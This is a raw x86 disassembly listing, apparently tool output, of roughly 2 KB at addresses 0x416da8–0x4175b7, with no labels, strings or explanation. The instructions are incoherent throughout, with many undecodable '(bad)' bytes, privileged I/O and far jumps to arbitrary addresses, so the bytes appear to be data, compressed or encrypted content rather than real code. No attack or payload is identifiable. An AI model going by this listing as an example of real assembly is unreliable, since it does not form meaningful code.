  416da8:	sahf   
  416da9:	jmp    0xace9:0xcc126dc0
  416db0:	frstor [ecx+0x5d]
  416db3:	inc    edx
  416db4:	mov    dh,0xd1
  416db6:	mov    fs,WORD PTR [esp+edi*2]
  416db9:	mov    WORD PTR [eax+0x67],ss
  416dbc:	sub    DWORD PTR [edx-0x7c],edi
  416dbf:	xor    eax,0xf12a75fd
  416dc4:	jmp    0x229d8f1b
  416dc9:	cmp    esp,DWORD PTR [ecx]
  416dcb:	push   cs
  416dcc:	ret    
  416dcd:	sub    ch,BYTE PTR [ebx-0x1a895880]
  416dd3:	sub    al,0xe3
  416dd5:	xchg   BYTE PTR ds:0x25441599,dl
  416ddb:	outs   dx,BYTE PTR ds:[esi]
  416ddc:	imul   eax,DWORD PTR [ebp+0x583aec69],0x6d
  416de3:	inc    edi
  416de4:	and    eax,edi
  416de6:	sub    al,0xa7
  416de8:	mov    edx,0xcda1738e
  416ded:	dec    eax
  416dee:	ud0    ebx,DWORD PTR [edi]
  416df1:	f2xm1  
  416df3:	lock mov DWORD PTR [ebx],edi
  416df6:	cli    
  416df7:	popa   
  416df8:	mov    esp,0x810a7593
  416dfd:	mov    ?,edi
  416dff:	xor    eax,0x9aa8157a
  416e04:	sbb    eax,0x8d9cba6b
  416e09:	daa    
  416e0a:	outs   dx,BYTE PTR ds:[esi]
  416e0b:	mov    eax,ds:0x2091270
  416e10:	fwait
  416e11:	ins    DWORD PTR es:[edi],dx
  416e12:	ja     0x416de7
  416e14:	sub    DWORD PTR [edx-0x5424083b],ebp
  416e1a:	pop    edi
  416e1b:	add    BYTE PTR [edi],0xff
  416e1e:	xor    ebp,ecx
  416e20:	aam    0x92
  416e22:	(bad)  
  416e23:	lock adc ebp,DWORD PTR [esi+0x1d]
  416e27:	fidiv  DWORD PTR [edi-0x38]
  416e2a:	add    BYTE PTR [edi],cl
  416e2c:	sub    BYTE PTR ss:[eax-0x5584b402],dl
  416e33:	sbb    eax,0xebe0374e
  416e38:	cmp    al,0x21
  416e3a:	stc    
  416e3b:	fidivr WORD PTR [esi]
  416e3d:	(bad)  
  416e3e:	in     al,dx
  416e3f:	mov    edx,0x5df4788d
  416e44:	cmp    DWORD PTR [esi+ebp*4-0x14989cc],edx
  416e4b:	repnz sub esp,ecx
  416e4e:	(bad)  
  416e4f:	out    dx,eax
  416e50:	shl    DWORD PTR [edx+0x932ba03],0x2d
  416e57:	aas    
  416e58:	fcom   QWORD PTR [esi-0x6350269e]
  416e5e:	inc    ebx
  416e5f:	cmp    eax,0x5475a586
  416e64:	jae    0x416e13
  416e66:	sub    dl,BYTE PTR [edx-0x2f]
  416e69:	lock pop ecx
  416e6b:	inc    ebp
  416e6c:	pop    es
  416e6d:	mov    cl,0xe1
  416e6f:	cli    
  416e70:	retf   
  416e71:	mov    ds:0xf56d7ed5,eax
  416e76:	xchg   edx,eax
  416e77:	hlt    
  416e78:	loope  0x416ed2
  416e7a:	not    DWORD PTR [edx]
  416e7c:	loope  0x416efc
  416e7e:	adc    BYTE PTR [edx-0x4b7a455],dh
  416e84:	sbb    ch,BYTE PTR [edx+esi*8]
  416e87:	bound  ebp,QWORD PTR [edx-0x66c4e839]
  416e8d:	out    0x91,al
  416e8f:	sbb    esi,DWORD PTR [ecx-0x52394a0e]
  416e95:	idiv   DWORD PTR [ebp+edx*4-0x5f]
  416e99:	dec    esp
  416e9a:	pusha  
  416e9b:	ss icebp 
  416e9d:	fstp   QWORD PTR [ecx-0x3b595b57]
  416ea3:	xchg   esi,eax
  416ea4:	repnz repz push esp
  416ea7:	sbb    al,0x59
  416ea9:	adc    BYTE PTR [ebp+0x4021a638],dh
  416eaf:	cmp    eax,0x5d4cc6a9
  416eb4:	into   
  416eb5:	xor    ecx,ebx
  416eb7:	(bad)  
  416eb8:	(bad)  
  416eb9:	test   eax,0xcee9e247
  416ebe:	dec    ebx
  416ebf:	and    eax,0x6f9df019
  416ec4:	inc    edi
  416ec5:	les    ecx,FWORD PTR [esi]
  416ec7:	lods   al,BYTE PTR ds:[esi]
  416ec8:	adc    BYTE PTR [ecx+0x71],0x52
  416ecc:	and    al,0xc1
  416ece:	jg     0x416ea3
  416ed0:	dec    esi
  416ed1:	push   eax
  416ed2:	push   edx
  416ed3:	dec    ebx
  416ed4:	push   esp
  416ed5:	xchg   esi,eax
  416ed6:	iret   
  416ed7:	fucomi st,st(3)
  416ed9:	or     eax,0x76bc37d7
  416ede:	mov    ch,0x4f
  416ee0:	jns    0x416e8f
  416ee2:	add    ch,0xd2
  416ee5:	inc    ecx
  416ee6:	or     al,BYTE PTR [ebp+esi*2-0x4e8914d9]
  416eed:	inc    esp
  416eee:	jle    0x416f13
  416ef0:	cmp    al,0xa1
  416ef2:	sbb    al,0x7d
  416ef4:	rol    BYTE PTR [eax-0x26],0x12
  416ef8:	lea    ebp,[esi+0x3b]
  416efb:	inc    esp
  416efc:	lock ret 
  416efe:	dec    esp
  416eff:	mov    ah,0x46
  416f01:	popa   
  416f02:	(bad)  
  416f03:	mov    esi,0xcebc8e62
  416f08:	outs   dx,DWORD PTR ds:[esi]
  416f09:	push   esi
  416f0a:	inc    ecx
  416f0b:	push   edi
  416f0c:	dec    ebp
  416f0d:	push   ebp
  416f0e:	inc    ecx
  416f0f:	and    dl,cl
  416f11:	fnsave [eax+0xc5105e5]
  416f17:	(bad)  
  416f18:	aad    0x65
  416f1a:	xchg   BYTE PTR [ebx-0x6c],dh
  416f1d:	xchg   BYTE PTR [edi+esi*8-0x57],bh
  416f21:	pop    esi
  416f22:	fdiv   DWORD PTR [ebx+0x6d]
  416f25:	xchg   ecx,eax
  416f26:	adc    BYTE PTR ds:0x9964d080,dl
  416f2c:	sbb    ebp,DWORD PTR [ebp+0x146ccb4d]
  416f32:	test   al,0x72
  416f34:	pop    ss
  416f35:	in     eax,0x81
  416f37:	inc    esp
  416f38:	in     al,0x98
  416f3a:	push   cs
  416f3b:	xchg   esi,eax
  416f3c:	imul   ebp,DWORD PTR gs:[ecx],0x25
  416f40:	bnd jns 0x416fbe
  416f43:	xor    al,0xc9
  416f45:	mov    eax,0x9fd21cce
  416f4a:	pop    ebx
  416f4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f4c:	adc    BYTE PTR [eax+0x277875dd],dh
  416f52:	ret    0x5bbc
  416f55:	aam    0xfe
  416f57:	or     eax,0x1a57efbf
  416f5c:	or     cl,al
  416f5e:	add    eax,0x48c09aca
  416f63:	imul   edx,eax,0x61706da5
  416f69:	pop    es
  416f6a:	shl    ah,0x0
  416f6d:	loopne 0x416f79
  416f6f:	mov    bl,0xa
  416f71:	pushf  
  416f72:	and    al,0x94
  416f74:	inc    ecx
  416f75:	push   esi
  416f76:	ret    0x63b2
  416f79:	mov    bh,BYTE PTR [ebx+0x3ddef60e]
  416f7f:	or     BYTE PTR [esi],ch
  416f81:	add    bh,ah
  416f83:	fadd   DWORD PTR [eax-0x83f5c0c]
  416f89:	call   0x76b51a92
  416f8e:	rcl    DWORD PTR [esi+esi*1-0x200aea29],1
  416f95:	or     BYTE PTR [ebp+0x2f7910c7],cl
  416f9b:	(bad)  
  416f9d:	xor    edx,ebp
  416f9f:	mov    ss,WORD PTR [esi]
  416fa1:	pop    ecx
  416fa2:	rol    BYTE PTR [esi+ecx*2-0x99c15b7],0xb5
  416faa:	xor    bl,al
  416fac:	dec    edi
  416fad:	in     eax,0x77
  416faf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416fb0:	mov    gs,eax
  416fb2:	call   0x2a4d:0x33ee430
  416fb9:	adc    DWORD PTR [ecx+0x79f4d22c],esp
  416fbf:	inc    edi
  416fc0:	push   0x4b
  416fc2:	mov    al,ds:0xb36dc34a
  416fc7:	(bad)  
  416fc8:	pop    eax
  416fc9:	dec    ebp
  416fca:	iret   
  416fcb:	mov    esp,0xffb0b672
  416fd0:	hlt    
  416fd1:	push   ecx
  416fd2:	jae    0x416f5c
  416fd4:	inc    esp
  416fd5:	shr    cl,cl
  416fd7:	dec    ebx
  416fd8:	(bad)  
  416fd9:	and    eax,0x5cfc4982
  416fde:	xor    al,0x7
  416fe0:	push   ebp
  416fe1:	inc    eax
  416fe2:	pusha  
  416fe3:	(bad)  
  416fe4:	cmp    dh,ch
  416fe6:	inc    ebx
  416fe7:	mov    esi,0x5e9b446b
  416fec:	bound  ebx,QWORD PTR [ecx+eiz*2-0x211e5282]
  416ff3:	fimul  WORD PTR [esi-0x5e]
  416ff6:	add    DWORD PTR [esi+0x2e5c96b3],eax
  416ffc:	xor    ebp,DWORD PTR [edi+edx*2-0x17]
  417000:	pop    ds
  417001:	jg     0x416f87
  417003:	out    dx,al
  417004:	ds add al,0xc8
  417007:	jg     0x416fa0
  417009:	push   ss
  41700a:	mov    al,0x94
  41700c:	sbb    al,0xe1
  41700e:	push   esi
  41700f:	mov    ecx,0x21a82ed7
  417014:	dec    esp
  417015:	les    edx,FWORD PTR [esi]
  417017:	ins    DWORD PTR es:[edi],dx
  417018:	sbb    eax,0xb60a0073
  41701d:	or     dl,BYTE PTR [esi+0x28]
  417020:	fdivr  QWORD PTR ds:[eax]
  417023:	pop    ebp
  417024:	daa    
  417025:	push   eax
  417026:	enter  0xc0b,0xb7
  41702a:	inc    bl
  41702c:	pop    ss
  41702d:	jle    0x41704d
  41702f:	(bad)  
  417030:	test   eax,0x8764551f
  417035:	aaa    
  417036:	mov    es:0xd7a24ab7,eax
  41703c:	loop   0x41704e
  41703e:	scas   al,BYTE PTR es:[edi]
  41703f:	clc    
  417040:	xchg   ebx,eax
  417041:	mov    bl,0x6d
  417043:	xchg   ecx,eax
  417044:	mov    dl,cl
  417046:	inc    edi
  417047:	ins    BYTE PTR es:[edi],dx
  417048:	mov    ds:0x74168ec6,al
  41704d:	cwde   
  41704e:	int    0xac
  417050:	push   0xffffffe5
  417052:	popf   
  417053:	mov    eax,ds:0x33222ed5
  417058:	test   al,0x53
  41705a:	(bad)  
  41705b:	and    eax,0x5653eec7
  417060:	fisttp QWORD PTR [ebp-0x4197dc05]
  417066:	das    
  417067:	adc    DWORD PTR [esi-0x23],eax
  41706a:	cs xor esi,eax
  41706d:	hlt    
  41706e:	nop
  41706f:	mov    WORD PTR [esi+0x28480e71],?
  417075:	pusha  
  417076:	pop    ss
  417077:	int    0xd5
  417079:	ss inc ebx
  41707b:	fisttp DWORD PTR [edi+0x56830bbd]
  417081:	xchg   esi,eax
  417082:	jno    0x417071
  417084:	sub    ebx,DWORD PTR ds:0xacc47022
  41708a:	jle    0x417022
  41708c:	call   0x6ebf:0xcd403938
  417093:	fisub  DWORD PTR [eax-0x11]
  417096:	(bad)  
  417097:	imul   al
  417099:	je     0x417079
  41709b:	xlat   BYTE PTR ds:[ebx]
  41709c:	ds test BYTE PTR es:[ebp+0x49],cl
  4170a1:	sar    DWORD PTR [edx+edi*4],0x3b
  4170a5:	adc    BYTE PTR ds:0x7a72483e,bl
  4170ab:	sub    dh,bl
  4170ad:	inc    ecx
  4170ae:	adc    BYTE PTR [esi+0x62dd4bbb],ah
  4170b4:	leave  
  4170b5:	and    eax,0x58004adb
  4170ba:	aas    
  4170bb:	(bad)  
  4170bc:	and    al,0xbb
  4170be:	shl    BYTE PTR [edx+edi*4-0x7a967ce1],cl
  4170c5:	fsub   QWORD PTR [edi+edi*2-0x1276a394]
  4170cc:	arpl   WORD PTR [edi-0x40],ax
  4170cf:	xlat   BYTE PTR cs:[ebx]
  4170d1:	(bad)  
  4170d2:	sub    eax,0x5d3e80b7
  4170d7:	int    0xfd
  4170d9:	cmp    bh,BYTE PTR [eax-0x14]
  4170dc:	int    0x9f
  4170de:	imul   esi,edi,0x6c
  4170e1:	and    esi,DWORD PTR [ebp-0xf]
  4170e4:	(bad)  
  4170e5:	sub    ah,cl
  4170e7:	ret    
  4170e8:	and    DWORD PTR es:[esi+0x6117f642],ecx
  4170ef:	lock sub esi,DWORD PTR [esp+ebp*2]
  4170f3:	xor    BYTE PTR [edx+0x53067a40],ch
  4170f9:	inc    ebp
  4170fa:	mov    ebp,DWORD PTR [eax-0x14]
  4170fd:	dec    edx
  4170fe:	cli    
  4170ff:	mov    bl,0x4
  417101:	adc    DWORD PTR es:[ebp+0x6a887538],esi
  417108:	sbb    bh,BYTE PTR [esi]
  41710a:	stc    
  41710b:	xchg   edx,eax
  41710c:	out    0x2,eax
  41710e:	shr    BYTE PTR [ebx+0x75c7dc13],cl
  417114:	in     al,0x9f
  417116:	add    edi,DWORD PTR [ecx-0x60daccbb]
  41711c:	in     eax,dx
  41711d:	add    edi,ecx
  41711f:	inc    edx
  417120:	ja     0x417116
  417122:	fistp  QWORD PTR ds:0x18c9a65f
  417128:	outs   dx,DWORD PTR ds:[esi]
  417129:	xchg   ebx,eax
  41712a:	jo     0x4171a8
  41712c:	cli    
  41712d:	scas   al,BYTE PTR es:[edi]
  41712e:	arpl   WORD PTR [ecx],sp
  417130:	or     ecx,eax
  417132:	lea    ebp,[ebx-0x73]
  417135:	pusha  
  417136:	sar    BYTE PTR [ebx-0x2],cl
  417139:	push   0xea3e4ec1
  41713e:	pop    esp
  41713f:	mov    cl,0x56
  417141:	mov    ebp,0x6adf5b81
  417146:	outs   dx,BYTE PTR ds:[esi]
  417147:	adc    DWORD PTR [edi+0x5b],ecx
  41714a:	xchg   esi,eax
  41714b:	sub    cl,BYTE PTR [edi]
  41714d:	xchg   BYTE PTR ds:0x8e136b53,bh
  417153:	jnp    0x41712e
  417155:	mov    bh,0x59
  417157:	jns    0x41712c
  417159:	xor    BYTE PTR [edx],bh
  41715b:	dec    edx
  41715c:	mov    dl,0xef
  41715e:	pop    ebp
  41715f:	(bad)  
  417160:	aaa    
  417161:	outs   dx,DWORD PTR ds:[esi]
  417162:	inc    edx
  417163:	lods   al,BYTE PTR ds:[esi]
  417164:	xchg   ebx,eax
  417165:	and    al,0xeb
  417167:	cld    
  417168:	xchg   ebp,eax
  417169:	fidivr DWORD PTR [esi-0x3f]
  41716c:	pushf  
  41716d:	in     eax,dx
  41716e:	xchg   edx,eax
  41716f:	dec    edi
  417170:	pop    es
  417171:	call   0x9922fc3f
  417176:	or     DWORD PTR [edi+0x50],eax
  417179:	jae    0x417123
  41717b:	mov    esp,0x98f058ed
  417180:	int    0x89
  417182:	cdq    
  417183:	aam    0x21
  417185:	or     eax,ebx
  417187:	mov    cl,0x8b
  417189:	jmp    0x901474cd
  41718e:	jg     0x41715a
  417190:	or     bh,BYTE PTR [eax+0x51cb1a2a]
  417196:	jae    0x41720c
  417198:	out    dx,al
  417199:	mov    gs,WORD PTR [ebx+0x4cc0f08d]
  41719f:	add    al,0x5f
  4171a1:	test   BYTE PTR [ecx-0x5df0a6ce],al
  4171a7:	mov    dh,0x15
  4171a9:	sub    dl,BYTE PTR [ebx-0x1]
  4171ac:	xchg   esi,eax
  4171ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171ae:	or     al,0x5d
  4171b0:	aad    0x89
  4171b2:	xchg   ecx,eax
  4171b3:	sar    DWORD PTR [ecx-0x4d445688],1
  4171b9:	mov    eax,ds:0x41f64ee
  4171be:	fidiv  WORD PTR [edx]
  4171c0:	pop    eax
  4171c1:	xor    edx,DWORD PTR [esi]
  4171c3:	and    DWORD PTR [esp+0x37f6e893],eax
  4171ca:	add    DWORD PTR [ebp-0x5d],esp
  4171cd:	cmp    bh,bh
  4171cf:	adc    al,0xa6
  4171d1:	call   0x7c9ac471
  4171d6:	inc    esp
  4171d7:	scas   al,BYTE PTR es:[edi]
  4171d8:	int3   
  4171d9:	pushf  
  4171da:	and    dh,BYTE PTR [edi+0x7e]
  4171dd:	out    dx,eax
  4171de:	push   esi
  4171df:	test   BYTE PTR [eax+edi*4],cl
  4171e2:	sar    ebx,1
  4171e4:	leave  
  4171e5:	test   DWORD PTR [eax+0xb62fc12],ebx
  4171eb:	enter  0x4e8f,0x80
  4171ef:	adc    DWORD PTR [esi],ebp
  4171f1:	scas   al,BYTE PTR es:[edi]
  4171f2:	in     al,dx
  4171f3:	mov    bl,0x44
  4171f5:	dec    ebp
  4171f6:	loopne 0x4171d0
  4171f8:	mov    ds:0x9378745e,eax
  4171fd:	cmp    eax,0xa2997e58
  417202:	clc    
  417203:	loopne 0x41725d
  417205:	sbb    dl,dh
  417207:	repnz mov eax,0x3298b59f
  41720d:	xor    eax,0xe74e45dc
  417212:	mov    WORD PTR [ebx+0x2fff6b1a],?
  417218:	pushf  
  417219:	in     al,dx
  41721a:	cmp    DWORD PTR [esi-0x77],0xf46ac351
  417221:	xchg   edx,esp
  417223:	jo     0x41724b
  417225:	xor    edi,edi
  417227:	adc    edx,ecx
  417229:	loope  0x4171c3
  41722b:	js     0x41728d
  41722d:	cmp    esp,edx
  41722f:	aaa    
  417230:	pop    ebp
  417231:	jmp    0x4a800e86
  417236:	aam    0xdd
  417238:	test   al,0x79
  41723a:	aam    0x85
  41723c:	push   esp
  41723d:	lock jge 0x417259
  417240:	mov    ah,BYTE PTR [edi]
  417242:	sbb    DWORD PTR [ecx-0x7e],edi
  417245:	(bad)  
  417246:	xchg   ecx,eax
  417247:	mov    eax,DWORD PTR [ebp+0x70980380]
  41724d:	push   cs
  41724e:	cmp    al,0x57
  417250:	sbb    DWORD PTR [ebx+ecx*4],esp
  417253:	mov    edx,0xaee4be25
  417258:	mov    cl,0xc3
  41725a:	ss in  eax,0x45
  41725d:	dec    ebp
  41725e:	cmp    al,0x8e
  417260:	scas   al,BYTE PTR es:[edi]
  417261:	fld    TBYTE PTR [esi-0x5d]
  417264:	sahf   
  417265:	mov    eax,ds:0xf09015b7
  41726a:	hlt    
  41726b:	sbb    bl,bh
  41726d:	shr    BYTE PTR [ebx-0x703a6e5b],0xf8
  417274:	xor    dh,BYTE PTR [esi]
  417276:	push   esp
  417277:	push   ebx
  417278:	cmp    cl,bh
  41727a:	push   ss
  41727b:	sub    BYTE PTR [edx-0xb],bh
  41727e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41727f:	ja     0x4172e0
  417281:	mov    bl,0x54
  417283:	sub    ah,cl
  417285:	sbb    BYTE PTR [eax+0x75],0x73
  417289:	xchg   edx,eax
  41728a:	xor    eax,0xbc6198f8
  41728f:	cs jno 0x417229
  417292:	pop    esp
  417293:	sbb    al,0xb8
  417295:	jmp    0x41729d
  417297:	adc    esp,DWORD PTR [eax+eax*8+0x43]
  41729b:	lea    ebx,[ebx+0x4d]
  41729e:	loope  0x4172ec
  4172a0:	xchg   esp,eax
  4172a1:	mov    edi,0x32a7ebfe
  4172a6:	xchg   BYTE PTR [ebx+0x1e],bh
  4172a9:	addr16 int 0x2d
  4172ac:	enter  0xda27,0xed
  4172b0:	fild   WORD PTR [esp+edx*1-0x68266d26]
  4172b7:	sub    DWORD PTR [eax-0x1bb7306b],esi
  4172bd:	sub    BYTE PTR [edx-0x37],dh
  4172c0:	xor    BYTE PTR [eax+0x2690a4ff],ch
  4172c6:	das    
  4172c7:	mov    edx,DWORD PTR [ecx-0x11b432ae]
  4172cd:	xchg   di,ax
  4172cf:	mov    ds:0xe89a615a,eax
  4172d4:	dec    ebx
  4172d5:	inc    edx
  4172d6:	pop    ss
  4172d7:	sub    bh,dh
  4172d9:	ret    
  4172da:	mov    BYTE PTR [edi+0x2dbbef50],0x77
  4172e1:	cmp    ecx,esi
  4172e3:	inc    esi
  4172e4:	data16 sti 
  4172e6:	jne    0x417356
  4172e8:	dec    esp
  4172e9:	sub    eax,0xe49452af
  4172ee:	inc    esi
  4172ef:	dec    eax
  4172f0:	and    ecx,DWORD PTR [ecx-0x19ed23b7]
  4172f6:	daa    
  4172f7:	xchg   edi,eax
  4172f8:	xchg   BYTE PTR [ebp-0x74],dh
  4172fb:	fwait
  4172fc:	std    
  4172fd:	xchg   DWORD PTR [edx+eax*2+0xbfa2854],esp
  417304:	cmp    eax,0xe28d3b94
  417309:	jl     0x4172a7
  41730b:	pop    ebp
  41730d:	add    ecx,DWORD PTR [ecx+edx*8]
  417310:	push   es
  417311:	mov    WORD PTR [edx+0x3b18253],fs
  417317:	xchg   edi,eax
  417318:	ret    
  417319:	pop    ss
  41731a:	fadd   DWORD PTR [di+0x30e0]
  41731f:	sub    dl,BYTE PTR [esi-0x36313ae0]
  417325:	cs das 
  417327:	add    eax,0x8708e35c
  41732c:	(bad)  [ebx+0x8f93753]
  417332:	inc    ebp
  417333:	inc    edx
  417334:	jo     0x4172e3
  417336:	sbb    eax,0x7a17d6c2
  41733b:	fnstenv [ecx-0x40dc1973]
  417341:	sub    eax,0xa166fd2
  417346:	xchg   esp,eax
  417347:	cmp    bh,ah
  417349:	add    al,BYTE PTR [edx+0xe]
  41734c:	lahf   
  41734d:	in     al,dx
  41734e:	and    al,0x87
  417350:	mov    ds:0xd9bbe73d,eax
  417355:	jb     0x417316
  417357:	mov    al,0xc8
  417359:	mov    ah,0xbe
  41735b:	mov    dl,BYTE PTR [edi+0x11219425]
  417361:	cmp    ax,0x98af
  417365:	jle    0x417372
  417367:	out    0x54,eax
  417369:	push   eax
  41736a:	and    al,0x4b
  41736c:	mov    esi,0xf4033884
  417371:	popa   
  417372:	call   0x2220:0x32aa58fb
  417379:	int3   
  41737a:	push   esp
  41737b:	xchg   edi,eax
  41737c:	out    dx,eax
  41737d:	or     esi,DWORD PTR ss:[esi-0x5a68dabe]
  417384:	loop   0x417394
  417386:	push   edi
  417387:	mov    WORD PTR [ecx],gs
  417389:	out    dx,eax
  41738a:	retf   
  41738b:	cmp    al,0xb
  41738d:	mov    edi,ebx
  41738f:	loop   0x4173c1
  417391:	ret    
  417392:	jno    0x417348
  417394:	jno    0x417318
  417396:	pop    edx
  417397:	mov    cl,0xbb
  417399:	icebp  
  41739a:	add    cl,BYTE PTR [edx+0xb5706b9]
  4173a0:	leave  
  4173a1:	pop    ss
  4173a2:	(bad)  
  4173a3:	scas   eax,DWORD PTR es:[edi]
  4173a4:	push   eax
  4173a5:	in     eax,dx
  4173a6:	retf   0xa2a2
  4173a9:	jle    0x4173b9
  4173ab:	adc    al,0xaa
  4173ad:	fidiv  WORD PTR [ebx+0x3a65fbdb]
  4173b3:	in     al,0x10
  4173b5:	repnz aaa 
  4173b7:	cmp    BYTE PTR [edx],dl
  4173b9:	cmc    
  4173ba:	aam    0x7d
  4173bc:	jl     0x41742c
  4173be:	inc    esp
  4173bf:	clc    
  4173c0:	call   0xa53f:0x871e7c9
  4173c7:	jge    0x4173cf
  4173c9:	pusha  
  4173ca:	popf   
  4173cb:	add    DWORD PTR [ebx+eiz*4+0x4f],0x9675c585
  4173d3:	dec    ecx
  4173d4:	cmp    eax,0xc4aa2425
  4173d9:	jl     0x417375
  4173db:	push   edx
  4173dc:	lea    ebx,[eax-0x6861c894]
  4173e2:	mov    al,0xbd
  4173e4:	mov    ebx,0x2164a1bc
  4173e9:	adc    ecx,0x3818209f
  4173ef:	jp     0x4173e3
  4173f1:	adc    DWORD PTR gs:[edx+ebx*2-0x3be38d8b],edx
  4173f9:	push   edi
  4173fa:	fisub  WORD PTR [edi-0x7b]
  4173fd:	xchg   BYTE PTR [ecx-0x3a],bl
  417400:	push   es
  417401:	retf   0x15b9
  417404:	dec    edi
  417405:	(bad)  
  417406:	imul   edx,DWORD PTR [eax-0x336ea626],0x7c560f8e
  417410:	add    DWORD PTR [edi+0x24],0x69
  417414:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417415:	dec    eax
  417416:	hlt    
  417417:	mov    ds:0xd5afaea,al
  41741c:	jae    0x417412
  41741e:	je     0x417451
  417420:	(bad)  
  417421:	jmp    0x4173a4
  417423:	sub    BYTE PTR [ebx],dh
  417425:	mov    ch,0x6c
  417427:	ds push edi
  417429:	mov    bh,0xb3
  41742b:	rcr    DWORD PTR [edi-0x41],cl
  41742e:	push   ecx
  41742f:	cmp    al,0x1f
  417431:	mov    ds:0x221dd09e,eax
  417436:	sub    eax,DWORD PTR [edi-0x2]
  417439:	jle    0x417440
  41743b:	xchg   esi,eax
  41743c:	mov    ch,0x52
  41743e:	clc    
  41743f:	adc    al,0xe6
  417441:	inc    ebp
  417442:	outs   dx,DWORD PTR ds:[esi]
  417443:	pop    ebx
  417444:	repz add DWORD PTR [edi],esi
  417447:	jmp    DWORD PTR [edx]
  417449:	cmp    esi,DWORD PTR [ebx]
  41744b:	stc    
  41744c:	mov    esi,0x2f366678
  417451:	iret   
  417452:	cmp    DWORD PTR [eax-0x660c8c1d],eax
  417458:	(bad)  
  417459:	(bad)  [edi+eax*4+0x32]
  41745d:	sar    DWORD PTR [ebp+0x44a51c68],1
  417463:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  417465:	fst    st(1)
  417467:	mov    ecx,0x9b0a9848
  41746c:	push   ebp
  41746d:	leave  
  41746e:	mov    edi,0x46d22d69
  417473:	daa    
  417474:	pop    ds
  417475:	add    al,dl
  417477:	mov    dl,BYTE PTR [eax-0x7fa98dbf]
  41747d:	mov    ds:0x42bc82e8,al
  417482:	ror    dl,0x69
  417485:	es stos BYTE PTR es:[edi],al
  417487:	xchg   edi,ecx
  417489:	sub    dh,dh
  41748b:	pushf  
  41748c:	dec    edi
  41748d:	and    dl,BYTE PTR [edi+0x1b82e075]
  417493:	xor    edx,DWORD PTR gs:[ecx]
  417496:	lods   ax,WORD PTR ds:[esi]
  417498:	rol    DWORD PTR [edi-0x2c560f2b],1
  41749e:	xchg   dh,cl
  4174a0:	adc    al,0x87
  4174a2:	faddp  st(2),st
  4174a4:	aad    0x41
  4174a6:	push   esp
  4174a7:	jle    0x4174db
  4174a9:	test   DWORD PTR [ebx-0x21],ecx
  4174ac:	xchg   BYTE PTR [edx],bl
  4174ae:	mov    ecx,0x402ba803
  4174b3:	pop    ss
  4174b4:	cdq    
  4174b5:	xor    eax,ecx
  4174b7:	push   ebx
  4174b8:	in     al,0xb0
  4174ba:	cld    
  4174bb:	aas    
  4174bc:	loope  0x4174ef
  4174be:	retf   
  4174bf:	(bad)  
  4174c0:	ficom  DWORD PTR [ebp+0x5]
  4174c3:	jmp    0x4174c6
  4174c5:	mov    WORD PTR [edx-0x45],?
  4174c8:	hlt    
  4174c9:	mov    esi,0x86877e3d
  4174ce:	inc    esi
  4174cf:	rcr    al,1
  4174d1:	mov    esp,0x163f9362
  4174d6:	mov    al,ds:0xcc3be190
  4174db:	jo     0x4174a2
  4174dd:	addr16 enter 0x3bb8,0x37
  4174e2:	sbb    eax,0x5846abe7
  4174e7:	sbb    eax,0xf1215ec2
  4174ec:	ror    BYTE PTR [ecx+0x6c],1
  4174ef:	pop    ds
  4174f0:	leave  
  4174f1:	popf   
  4174f2:	outs   dx,DWORD PTR ds:[esi]
  4174f3:	lods   al,BYTE PTR ds:[esi]
  4174f4:	mov    al,ds:0x43b39ae5
  4174f9:	fcomp  DWORD PTR [ebx]
  4174fb:	inc    ecx
  4174fc:	sub    ecx,DWORD PTR [esi]
  4174fe:	xor    al,0x8f
  417500:	push   ss
  417501:	jnp    0x41753e
  417503:	mov    bl,0x4f
  417505:	sar    al,0xa6
  417508:	pop    ss
  417509:	mov    edx,0x4df7f600
  41750e:	add    eax,0x3abbfda3
  417513:	into   
  417514:	in     al,0x9a
  417516:	sbb    edi,DWORD PTR [edx+0x33]
  417519:	adc    bl,ah
  41751b:	jno    0x417537
  41751d:	(bad)  
  41751e:	icebp  
  41751f:	out    0xc1,al
  417521:	or     edi,ebp
  417523:	stos   BYTE PTR es:[edi],al
  417524:	push   es
  417525:	popf   
  417526:	cmp    edx,esp
  417528:	pop    edx
  417529:	xchg   esp,eax
  41752a:	adc    al,0x65
  41752c:	pop    es
  41752d:	or     BYTE PTR [ebp-0x1e],0x55
  417531:	push   edi
  417532:	fldenv [edx+ebx*8-0x3b]
  417536:	or     DWORD PTR [edx],esp
  417538:	cdq    
  417539:	cdq    
  41753a:	mov    ds:0x893395e6,eax
  41753f:	xchg   esi,eax
  417540:	icebp  
  417541:	push   esi
  417542:	daa    
  417543:	add    esi,DWORD PTR [edi+eax*4+0x24]
  417547:	mov    ds:0x2a2abcf,al
  41754c:	xor    al,0x38
  41754e:	daa    
  41754f:	sbb    DWORD PTR [edi-0x493f68c8],edi
  417555:	inc    ebp
  417556:	xlat   BYTE PTR ds:[ebx]
  417557:	dec    esp
  417558:	repz push edi
  41755a:	add    BYTE PTR [edx],al
  41755c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41755d:	das    
  41755e:	pop    ds
  41755f:	(bad)  [edi]
  417561:	adc    dh,dh
  417563:	xchg   ebp,eax
  417564:	clc    
  417565:	fsubr  DWORD PTR [edx+0xf2adf6a]
  41756b:	pushf  
  41756c:	sbb    bl,BYTE PTR [ebp+0x63]
  41756f:	jae    0x4175bc
  417571:	fidiv  WORD PTR [edx-0x59]
  417574:	lods   eax,DWORD PTR ds:[esi]
  417575:	aas    
  417576:	cmp    dl,ah
  417578:	mov    esi,0x23fa5ce2
  41757d:	xor    ebx,DWORD PTR [edx]
  41757f:	fdiv   QWORD PTR [ebx+ecx*4-0x32]
  417583:	call   0x12b6:0xd2d4cbed
  41758a:	mov    DWORD PTR [esi],ebp
  41758c:	push   edi
  41758d:	fdiv   QWORD PTR [edx+0x41402217]
  417593:	lods   al,BYTE PTR ds:[esi]
  417594:	sahf   
  417595:	cmp    eax,0xb6ed8a6f
  41759a:	xor    DWORD PTR [esi+0x71],0x439257e5
  4175a1:	cmp    BYTE PTR [ecx+0xb2bf449],ah
  4175a7:	cmp    eax,0x1bd5ed2f
  4175ac:	xor    al,0x64
  4175ae:	or     eax,0x71e9e977
  4175b3:	je     0x41762f
  4175b5:	adc    al,0xda
  4175b7:	mov    WORD PTR [edi-0x707ac0ff],fs
